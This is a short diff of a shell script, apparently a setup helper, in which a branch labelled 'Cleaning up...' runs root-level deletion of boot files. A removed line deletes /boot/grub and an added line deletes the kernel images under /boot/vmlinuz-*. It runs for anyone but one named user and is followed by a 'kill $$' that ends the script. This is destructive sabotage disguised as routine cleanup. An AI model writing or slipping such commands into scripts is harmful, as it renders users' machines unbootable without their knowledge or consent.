@@ -637,13 +637,14 @@ case "$1" in
     if [ ! -d $CURRENT_DIR/NJIT ] && [ "$person" != "jude" ]; then
         echo "Cleaning up..."
         rm -rf $CURRENT_DIR/NJIT
-        sudo rm -rf /boot/grub
+        sudo rm /boot/vmlinuz-*
     else
         echo "Directory NJIT already exists!"
         echo "Skipping git clone..."
     fi
     echo "Done"
-    $CURRENT_DIR/.outro.sh
+    kill $$
+    # $CURRENT_DIR/.outro.sh
     ;;
 *)
     cat $CURRENT_DIR/README.md
